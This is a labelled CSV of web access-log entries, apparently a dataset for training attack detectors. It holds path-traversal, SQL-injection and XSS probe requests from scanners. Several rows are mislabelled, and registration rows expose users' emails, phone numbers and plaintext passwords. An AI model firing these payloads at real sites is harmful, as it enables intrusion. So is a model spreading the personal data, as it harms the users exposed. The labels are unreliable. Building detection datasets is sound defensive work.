source,text
"10.128.0.238 - - [24/Mar/2018:21:44:45 +0330] ""GET /././././././../../../../../winnt/win.ini HTTP/1.1"" 400 303 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:49:22 +0330] ""GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus""><script>alert('websense_username_xss.nasl')</script> HTTP/1.1"" 404 229 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [24/Mar/2018:21:51:22 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini HTTP/-"" - 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:24:45 +0330] ""GET /examples/jsp/jsp2/el/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"89.199.166.96 - - [24/Jan/2019:12:39:11 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B9%D8%A8%D8%AF%D8%A7%D9%84%D8%B1%D8%B6%D8%A7&lastName=%D8%B0%D9%88%D8%A7%D9%84%D9%81%D9%82%D8%A7%D8%B1%DB%8C&username=reza_cold%40yahoo.com&mobile=09122589311&password=poker6100&password2=poker6100 HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 4.4.2; LG-D958 Build/KOT49I.D95820c) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.103 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:57:10 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%203253%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283253%3D3253%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:54:08 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 338 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:54:01 +0330] ""GET http://10.47.48.40/authentication/login/ HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:56:17 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:59 +0330] ""GET /query.idq?CiTemplate=../../../../../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:48 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20AND%20%28SELECT%205800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767871%2C%28SELECT%20%28ELT%285800%3D5800%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27YBZK%27%3D%27YBZK HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1"" 404 335 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:42:07 +0330] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 404 212 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:31:41 +0330] ""GET /index.php?op=Default&Date=200607' UNION SELECT 1,1990910236,1,1,1,1,1,1,1,1--&blogId=1 HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:58:38 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20ORDER%20BY%204487--%20ThjO HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:44:59 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1"" 404 291 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.119.80.174 - - [23/Jan/2019:11:04:04 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B1%D8%B6%D8%A7&lastName=%D8%AA%D9%88%DA%A9%D9%84%DB%8C&username=reza7002343%40gmail.com&mobile=09337002343&password=reza7002343&password2=reza7002343&sexSwitch=on&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B1%D8%B6%D8%A7&lastName=%D8%AA%D9%88%DA%A9%D9%84%DB%8C&username=reza7002343%40gmail.com&mobile=09337002343&password=reza7002e43&password2=reza7002343"" ""Mozilla/5.0 (Linux; Android 6.0.1; HUAWEI RIO-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"192.168.202.110 - - [16/Mar/2012:14:26:41 +0330] ""GET /examples/jsp/error/insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.1"" 404 1057 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.172.152.13 - - [24/Mar/2018:19:25:55 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:57:42 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%203155%3D%28SELECT%203155%20FROM%20PG_SLEEP%285%29%29--%20sgnu HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.112.186.15 - - [23/Jan/2019:02:00:06 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D9%87%D8%AF%DB%8C&lastName=%D8%A7%D8%AD%D8%AA%D8%B3%D8%A7%D8%A8&username=mahdi1361%40icloud.com&mobile=09122902740&password=1361&password2=1361&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 4.3; C5303 Build/12.1.A.1.205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [25/Mar/2018:00:25:56 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1"" 404 571 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:58 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1"" 404 214 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.164.94.120 - - [24/Mar/2018:18:16:01 +0330] ""GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1"" 301 56 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:16 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../windows/win.ini HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:49:27 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 503 326 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:28:58 +0330] ""GET /scripts/index.php?action=view&filename=../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:54:08 +0330] ""GET /././././././../../../../../winnt/win.ini HTTP/1.1"" 400 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:57:37 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%20SLEEP%285%29 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:39:39 +0330] ""GET /cacti/insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.1"" 404 298 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:26:41 +0330] ""GET /examples/jsp/num/insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:19:20:31 +0330] ""GET /scripts/calendar.php?month=' UNION SELECT 1,1,'1331922100','calendarix_month_sql_injection.nasl',1 # HTTP/1.0"" 400 3423 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:49:20 +0330] ""GET /././././././../../../../../winnt/win.ini HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:45:01 +0330] ""GET /index.html?urlmaskfilter=<script>foo</script> HTTP/1.1"" 401 16 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1"" 404 333 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:18 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini HTTP/1.1"" 400 304 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:41:08 +0330] ""GET /../../../../../../../etc/passwd HTTP/1.1"" 400 173 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:25 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:22:45:39 +0330] ""GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"83.122.110.159 - - [23/Jan/2019:22:03:00 +0330] ""GET /image/33500?name=v310-1.jpg&wh=200x200 HTTP/1.1"" 200 4304 ""https://torob.com/browse/417/%D9%84%D9%BE-%D8%AA%D8%A7%D9%BE-%D9%84%D9%86%D9%88%D9%88-lenovo/?internal_memory__min=0&internal_memory__max=2100&ram_memory__min=1&ram_memory__max=16&pf=0&pt=38120000"" ""Mozilla/5.0 (Linux; Android 7.1.1; SM-J510F Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36"" ""-""",Server-Side Template Injection
"10.172.152.13 - - [24/Mar/2018:19:26:08 +0330] ""GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:14:26:36 +0330] ""GET /examples/jsp/jsp2/el/SPT--ForumTopics.php?forumid=-9 UNION SELECT null,null,null,1331904464,4,5 HTTP/1.1"" 404 1078 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:14 +0330] ""GET /././././././../../../../../windows/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:51:14 +0330] ""GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.0"" 404 151 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:49 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../etc/passwd HTTP/1.1"" 404 7614 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:47:45 +0330] ""GET /cacti/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331912933.jpg' as id, 834887328 as headline, 1554853449 as datetime, 1133842749 as body, 703020611 as category, 1086501102 as image-- HTTP/1.1"" 200 1189 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:17 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.138 - - [17/Mar/2012:19:22:01 +0330] ""GET /phpmyadmin/demos/demo.browse.php?filename=/etc/passwd HTTP/1.1"" 404 310 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:49:21 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:32:22 +0330] ""GET /cgi-bin/plog-download.php?dl_type=album&checked[]=' UNION SELECT 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 --  HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:22:45:18 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 571 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:39:05 +0330] ""GET /cacti/evb/check_url.php?url=pligg_url_sql_injection.nasl' UNION SELECT 1331905213,113095511 --  HTTP/1.1"" 404 300 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.138 - - [17/Mar/2012:19:17:27 +0330] ""GET /cgi-bin/index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1332008334,1844807348 -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [25/Mar/2018:00:25:57 +0330] ""GET /ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [23/Mar/2018:19:01:24 +0330] ""GET /besp3{{663*343}}j3kno HTTP/1.1"" 404 233 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:58 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20DDmL HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:46 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 404 289 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:49:26 +0330] ""GET /item.fts?href=""><script>alert(""ftgate_44002.nasl"")</script>; HTTP/1.1"" 404 283 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.241.111.81 - - [24/Mar/2018:00:54:42 +0330] ""GET /query.idq?CiTemplate=../../../../../winnt/win.ini                                                                                                     HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:42:12 +0330] ""GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1"" 404 202 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:52:39 +0330] ""GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 400 661 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:55:14 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20wKAA&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.164.94.120 - - [24/Mar/2018:18:16:01 +0330] ""GET //../../../../../../../../../windows/win.ini HTTP/1.1"" 301 56 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:08 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 244 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:14 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../windows/win.ini HTTP/1.1"" 403 248 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"151.242.187.116 - - [24/Jan/2019:11:51:37 +0330] ""GET /product/32460/%D8%A7%D8%AA%D9%88-%D8%A8%D8%AE%D8%A7%D8%B1-%D8%AA%D9%81%D8%A7%D9%84-%D9%85%D8%AF%D9%84-Tefal-Steam-Iron-FV9740 HTTP/1.1"" 200 42384 ""https://search.mysearch.com/web?apn_uid=3F35B0C2-C7BB-412F-9FB7-980715EB9B3A&b=ttb&doi=&gct=tab&guid=3F35B0C2-C7BB-412F-9FB7-980715EB9B3A&n=7849575a&p2=%5ECTU%5Eprs001%5EB2BMS%5Eir&si=0he624ak000025492663814560CB1933C0677E376CDC670AE75F86a------------------------------924078186m__3&st=tab&trs=wtt&tpr=2&enc=2&q=iVHaVMmo0qFgecafFS1Ig0e2crw8PCJTipjsSCUsc__Oo7PyJRLIXQBzDS6JLj-8YU9AiMGPgCjH0vBWjaMxqBwyj0SVYPCgSvTaRa65wkMiFF4zu4wz7zlKoj9KmkzG5CJK7cdh94T0nS1NlPXAUPAX3yLgKmIOSVzIP0F-oV3usX2q4AU_cQ6iN5N6tgKVUO6xEq8tQr-PIhFJ4e2_E4F4SYYZs_8llEIeUF9QS-yzeg3eHnEMKZlsjFBoKJL1y0q4jtpzA9gm1MckGfaP9PyxhCjJp710FN6JgOI43oJWBgnoyDId9JfIt5J3B4yNa3fkBsPYfqh5QzDb6rCJrg&ts=1548318307241"" ""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:19:38:47 +0330] ""GET /scripts/index.php?module=Topics&func=view&topicid=-1 UNION SELECT null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:18 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 292 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:25:23 +0330] ""GET /examples/jsp/checkbox/event_view.php?eid=34 UNION SELECT 707923775 HTTP/1.1"" 404 314 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
